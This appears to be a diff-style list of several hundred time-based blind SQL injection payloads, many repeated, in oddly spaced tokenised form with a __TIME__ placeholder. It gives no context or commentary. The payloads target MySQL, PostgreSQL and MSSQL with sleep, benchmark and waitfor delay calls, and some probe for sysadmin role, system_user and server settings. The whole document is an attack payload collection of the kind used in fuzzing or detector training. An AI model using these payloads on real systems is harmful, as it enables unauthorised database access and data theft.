+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or sleep  (  __TIME__  )    =  '
+1'  )   rlike sleep  (  5  )  #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  __TIME__  )  #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or sleep  (  5  )  #
+1  )   or sleep  (  __TIME__  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1 or pg_sleep  (  __TIME__  )  --
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1  )   or sleep  (  __TIME__  )  #
+1 or pg_sleep  (  __TIME__  )  --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+"   )    )    or pg_sleep  (  __TIME__  )  --
+ )   or pg_sleep  (  __TIME__  )  --
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1" where 7739  =  7739 and sleep  (  5  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+or sleep  (  __TIME__  )    =  '
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+" or pg_sleep  (  __TIME__  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+a' waitfor delay '0:0:10'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+"  )   or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+a' waitfor delay '0:0:10'--
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   rlike sleep  (  5  )   and   (  "%"  =  "
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+ )  ,waitfor delay '0:0:__TIME__'--
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+,waitfor delay '0:0:__TIME__'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1%"  )   rlike sleep  (  5  )   and   (  "%"  =  "
+ )   or pg_sleep  (  __TIME__  )  --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+"   )    )    or sleep  (  __TIME__  )    =  "
+or sleep  (  __TIME__  )    =  '
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )  #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )    =  '
+ )    )    or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+" or pg_sleep  (  __TIME__  )  --
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 waitfor delay '0:0:10'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   or sleep  (  __TIME__  )  #
+1  )   or sleep  (  __TIME__  )  #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+a' waitfor delay '0:0:10'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ )   or pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+"   )    )    or pg_sleep  (  __TIME__  )  --
+"   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1  )   or sleep  (  __TIME__  )  #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+, if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+a' waitfor delay '0:0:10'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1 or pg_sleep  (  __TIME__  )  --
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+or sleep  (  __TIME__  )  #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"   )    )    or pg_sleep  (  __TIME__  )  --
+ )    )    or sleep  (  __TIME__  )    =  '
+1   )    )    or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )    =  '
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 7739  =  7739 and sleep  (  5  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )    =  '
+ )    )   ,waitfor delay '0:0:__TIME__'--
+ )   or sleep  (  __TIME__  )    =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1   )    )    or sleep  (  __TIME__  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'  )   rlike sleep  (  5  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+a' waitfor delay '0:0:10'--
+1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or sleep  (  __TIME__  )    =  "
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+"  )   or pg_sleep  (  __TIME__  )  --
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )  #
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+or sleep  (  __TIME__  )  #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ )    )    or pg_sleep  (  __TIME__  )  --
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1   )    )    or sleep  (  __TIME__  )  #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"  )   rlike sleep  (  5  )   and   (  "%"  =  "
+, if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1  )   or sleep  (  __TIME__  )  #
+a' waitfor delay '0:0:10'--
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+"  )   or sleep  (  __TIME__  )    =  "
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1" where 7739  =  7739 and sleep  (  5  )  --
+1" where 7739  =  7739 and sleep  (  5  )  --
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1 or benchmark  (  10000000,MD5  (  1   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+pg_sleep  (  __TIME__  )  --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+"   )    )   ;waitfor delay '0:0:__TIME__'--
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ )    )    or sleep  (  __TIME__  )    =  '
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )  #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+ )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or sleep  (  __TIME__  )  #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or pg_sleep  (  __TIME__  )  --
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+ )   or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+ )    )    or sleep  (  __TIME__  )    =  '
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1%" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1 or pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+"  )   or sleep  (  __TIME__  )    =  "
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+pg_sleep  (  __TIME__  )  --
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+ )   or pg_sleep  (  __TIME__  )  --
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+ )    )   ,waitfor delay '0:0:__TIME__'--
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+or sleep  (  __TIME__  )  #
+, if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --
+or sleep  (  __TIME__  )    =  '
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn
+1"   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+" or sleep  (  __TIME__  )    =  "
+ or benchmark  (  10000000,MD5  (  1   )    )   #
+or sleep  (  __TIME__  )  #
+1 waitfor delay '0:0:10'--
+1"  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+"  )   or sleep  (  __TIME__  )    =  "
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1   )    )    or pg_sleep  (  __TIME__  )  --
+" or sleep  (  __TIME__  )  #
+"  )   or benchmark  (  10000000,MD5  (  1   )    )   #
+1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
